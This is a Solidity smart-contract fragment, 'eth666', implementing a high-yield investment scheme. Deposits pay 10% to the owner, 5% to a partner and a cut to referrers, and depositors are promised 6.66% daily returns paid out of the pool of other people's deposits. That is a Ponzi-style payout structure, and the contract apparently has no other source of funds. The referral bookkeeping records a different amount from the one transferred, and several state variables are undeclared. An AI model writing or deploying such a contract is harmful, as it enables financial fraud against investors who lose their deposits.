contract eth666 {
function() payable external {
		emit invest(msg.sender,msg.value);
		uint256 admRefPerc = msg.value / 10;
		uint256 advPerc    = msg.value / 20;

		owner.transfer(admRefPerc);
		partner.transfer(advPerc);

		if (deposited[msg.sender] != 0 && isStart != 0) {
			address investor = msg.sender;
            // calculate profit amount as such:
            // amount = (amount invested) * 6.66% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 depositsPercents = deposited[msg.sender] * 666 / 10000 * (block.number - blocklock[msg.sender]) /5900;
			investor.transfer(depositsPercents);

			withdrew[msg.sender] += depositsPercents;
			totalWithdrewWei += depositsPercents;
		} else if (deposited[msg.sender] == 0 && isStart != 0)
			investorNum += 1;

		address referrer = bytesToAddress(msg.data);
		if (referrer > 0x0 && referrer != msg.sender) {
			referrer.transfer(admRefPerc);
			refearned[referrer] += advPerc;
		}

		blocklock[msg.sender] = block.number;
		deposited[msg.sender] += msg.value;
		totalDepositedWei += msg.value;
	}
}